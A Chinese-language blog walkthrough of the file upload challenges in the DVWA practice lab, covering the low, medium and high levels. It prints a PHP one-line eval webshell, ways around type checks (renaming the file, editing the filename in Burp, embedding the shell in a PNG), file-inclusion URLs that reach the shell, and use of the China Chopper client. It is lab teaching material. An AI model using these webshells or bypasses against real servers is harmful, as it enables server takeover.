---
title:      "File Upload ---dvwa"
description: "主要用来记录dvwa靶场 中 文件上传 破解方式"
author:     "伍帆"
image: "/img/home-bg.jpg"
date: 2022-06-27
published: true
tags:
    - 靶场
    - dvwa
URL: "/2022/6/File Upload/"
categories: [ "网安" ]
---


## 文件上传漏洞简介
>File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的

## LOW 级别破解
>查看源代码
![](/img/FileUpload/low.png)
> 可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。

文件上传漏洞的利用是有限制条件的，首先`当然是要能够成功上传木马文件`，其次`上传文件必须能够被执行`，最后就是`上传文件的路径必须可知`。不幸的是，这里三个条件全都满足。

#### 1.编写木马文件
```php
<?php
@eval($_REQUEST['cmd']);phpinfo();
?>
```
![](/img/FileUpload/1-1.png)

#### 2.上传木马文件
![](/img/FileUpload/1-2.png)
上传成功，并且返回了上传路径

#### 3.权限获得
打开中国菜刀，添加上一步获得到的上传路径
![](/img/FileUpload/1-3.png)
然后菜刀就会通过向服务器发送包含cmd参数的post请求，在服务器上执行任意命令，获取webshell权限。
![](/img/FileUpload/1-4.png)
可以下载、修改服务器的所有文件。
可以打开终端
![](/img/FileUpload/1-5.png)

## Medium别破解
>查看源代码
![](/img/FileUpload/medium.png)
> Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）

### 方法1：组合拳（文件包含+文件上传）
因为采用的是一句话木马，所以文件大小不会有问题，至于文件类型的检查，尝试修改文件名为cmd.png。
#### 1.将文件构造成png后缀形式
![](/img/FileUpload/2-1.png)

#### 2. 上传png形式的图片
![](/img/FileUpload/2-2.png)


#### 3.尝试使用中国菜刀进行权限获得
![](/img/FileUpload/2-3.png)
虽然成功上传了文件，但是并不能成功获取webshell权限，在菜刀上无论进行什么操作都会返回如下信息
![](/img/FileUpload/2-4.png)
中国菜刀的原理是向上传文件发送包含cmd参数的post请求，通过控制apple参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送post请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。

那么如何让服务器将其解析为php文件呢？我们想到文件包含漏洞。这里可以借助Medium级别的文件包含漏洞来获取webshell权限，打开中国菜刀，右键添加，在地址栏中输入

`http://127.0.0.1/vulnerabilities/fi/?page=hthttp://tp://127.0.0.1/hackable/uploads/cmd.png`

进而获得webshell 的权限

### 方法2：抓包修改文件类型

#### 1.通过burpSuite进行抓包
上传cmd.png文件，抓包。
![](/img/FileUpload/2-6.png)

#### 2.更改filename 
可以看到文件类型为image/png，尝试修改filename为`cmd.php`。
![](/img/FileUpload/2-7.png)

#### 3.尝试使用中国菜刀进行权限获得
![](/img/FileUpload/2-8.png)
![](/img/FileUpload/2-9.png)


## High 级别破解
>查看源代码
>![](/img/FileUpload/high.png)
>High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”*.jpg”、”*.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型

#### 1.图片和文件合并
利用copy将一句话木马文件cmd.php与图片文件1.png合并
![](/img/FileUpload/3-1.png)

使用 `copy 1.png/b+cmd.php/a hack.png` 命令 生成hack.png 图片
![](/img/FileUpload/3-2.png)
![](/img/FileUpload/3-3.png)

打开hack.png可以看到，一句话木马藏到了最后
![](/img/FileUpload/3-4.png)

#### 2.上传文件
![](/img/FileUpload/3-5.png)
成功上传文件

#### 3.通过文件包含去进行访问
点击文件包含页面 然后替换url为：
`http://127.0.0.1/vulnerabilities/fi/?page=file:///D:\phpstudy_pro\WWW\DVWA\hackable\uploads\hack.png`
![](/img/FileUpload/3-7.png)

![](/img/FileUpload/3-6.png)